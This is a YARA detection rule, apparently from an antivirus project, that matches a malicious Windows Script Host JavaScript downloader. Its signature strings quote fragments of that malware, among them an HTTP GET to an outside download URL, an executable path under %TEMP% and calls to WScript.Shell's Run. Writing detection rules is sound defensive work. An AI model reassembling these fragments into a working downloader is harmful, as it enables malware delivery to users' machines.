rule sig_20160328_62574fb5f903648bf056d6b06dfffb48 {
  meta:
    description = "datamaliciousorder - file 20160328_62574fb5f903648bf056d6b06dfffb48.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6e145c09f05f9d5c231b3e007dbb058c605d00c9c678daf0a9a3c88e1ed050d5"

  strings:
    $s1  = "function Qbalcuxnw() {return Wgfny[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Bcnjiu6SN77CnY.exe\";};" fullword ascii
    $s2  = "Lbzci[Fopnbqqj](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Xaqzrkw](Azzqassqj() * 11)} while (Lbzci[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Wgfny = function Fawhludm() {return WScript[Jktmb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Tuxnmy(Emnwbow, Lcobrjr){return Emnwbow - Lcobrjr;};" fullword ascii
    $s6  = "function Mkeuobhu(Eqblhe){Wgfny[\"Run\"](Eqblhe, Jjiylu, Jjiylu);};" fullword ascii
    $s7  = "var Ozpmtt = new this[\"Date\"]();" fullword ascii
    $s8  = "var Amzbb = false;" fullword ascii
    $s9  = "return Tuxnmy(Bhqfskqi, Kkphnayj);" fullword ascii
    $s10 = "function Dkshzjk(Aiiwhnre) {var Whhbpajzup = (1, 2, 3, 4, 5, Aiiwhnre); return Whhbpajzup;};" fullword ascii
    $s11 = "Vizvayxhu = true; " fullword ascii
    $s12 = "var Vizvayxhu = false;" fullword ascii
    $s13 = " while (Htiweuvr){" fullword ascii
    $s14 = "function Ksoxrfix(){return Ckokb;};" fullword ascii
    $s15 = "function Yyjydda()" fullword ascii
    $s16 = "function Nulnxna(){return Jktmb;};" fullword ascii
    $s17 = "function Azzqassqj(){return 22;};" fullword ascii
    $s18 = "function Kwqtalfn() {return ((Vizvayxhu == true) && (Vizvayxhu == Vubzca)) ? 1 : Jjiylu;};" fullword ascii
    $s19 = "var Vubzca = false;" fullword ascii
    $s20 = "Vubzca = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}